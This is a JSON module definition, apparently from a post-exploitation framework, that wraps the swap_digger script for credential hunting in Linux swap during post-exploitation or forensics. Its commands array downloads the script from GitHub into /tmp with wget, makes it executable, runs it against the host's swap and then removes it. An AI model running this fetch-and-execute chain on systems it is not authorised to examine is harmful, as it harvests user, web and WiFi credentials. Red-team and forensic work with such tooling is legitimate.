{
  "base": {
    "name": "Swap Digger",
    "author": ["Russel Van Tuyl @Ne0nd0g)"],
    "credits": ["Emeric “Sio” Nasi (@EmericNasi)"],
    "path": ["linux", "x64", "bash", "credentials", "SwapDigger.json"],
    "platform": "linux",
    "arch": "x64",
    "lang": "bash",
    "type": "standard",
    "privilege": true,
    "notes": "http://blog.sevagas.com/?Digging-passwords-in-Linux-swap",
    "remote": "https://raw.githubusercontent.com/sevagas/swap_digger/master/swap_digger.sh",
    "local": ["data", "src", "sevagas", "swap_digger", "swap_digger.sh"],
    "options": [
      {"name": "extended", "value": "", "required": false, "flag": "--extended", "description":"[switch]Run Extended tests on the target swap to retrieve other interesting data (web passwords, emails, wifi creds, most accessed urls, etc)"},
      {"name": "guessing", "value": "", "required": false, "flag": "--guessing", "description":"[switch]Try to guess potential passwords based on observations and stats. Warning: This option is not reliable, it may dig more passwords as well as hundreds false positives."},
      {"name": "help", "value": "", "required": false, "flag": "-h", "description":"[switch]Display the help."},
      {"name": "verbose", "value": "", "required": false, "flag": "-v", "description":"[switch]Verbose mode."},
      {"name": "log", "value": "", "required": false, "flag": "--log", "description":"Log all outputs in a log file (protected inside the generated working directory)."},
      {"name": "clean", "value": "", "required": false, "flag": "--clean", "description":"Automatically erase the generated working directory at end of script (will also remove log file)"},
      {"name": "rootPath", "value": "", "required": false, "flag": "--root-path", "description":"Location of the target file-system root (default value is /). Change this value for forensic analysis when target is a mounted file system. This option has to  be used along the -s option to indicate path to swap device."},
      {"name": "swapPath", "value": "", "required": false, "flag": "--swap-path", "description":"Location of swap device or swap dump to analyse. Use this option for forensic/remote analysis of a swap dump or a mounted external swap partition. This option should be used with the -r option where at least /<root-path>/etc/shadow exists."},
      {"name": "swapSearch", "value": "", "required": false, "flag": "--swap-search", "description":"[switch]Search for all available swap devices (use for forensics)."}
    ],
    "description": "swap_digger is a bash script used to automate Linux swap analysis for post-exploitation or forensics purpose. It automates swap extraction and searches for Linux user credentials, Web form credentials, Web form emails, HTTP basic authentication, WiFi SSID and keys, etc.",
    "commands": [
      "/bin/sh",
      "-c",
      "\"wget", "-O",
      "/tmp/swap_digger.sh https://raw.githubusercontent.com/sevagas/swap_digger/master/swap_digger.sh;",
      "chmod",
      "+x",
      "/tmp/swap_digger.sh;",
      "/tmp/swap_digger.sh -vxc;",
      "{{extended.Flag}}",
      "{{guessing.Flag}}",
      "{{help.Flag}}",
      "{{verbose.Flag}}",
      "{{log.Flag}}",
      "{{clean.Flag}}",
      "{{rootPath}}",
      "{{swapPath}}",
      "{{swapSearch.Flag}}",
      "rm /tmp/swap_digger.sh\""
    ]
  }
}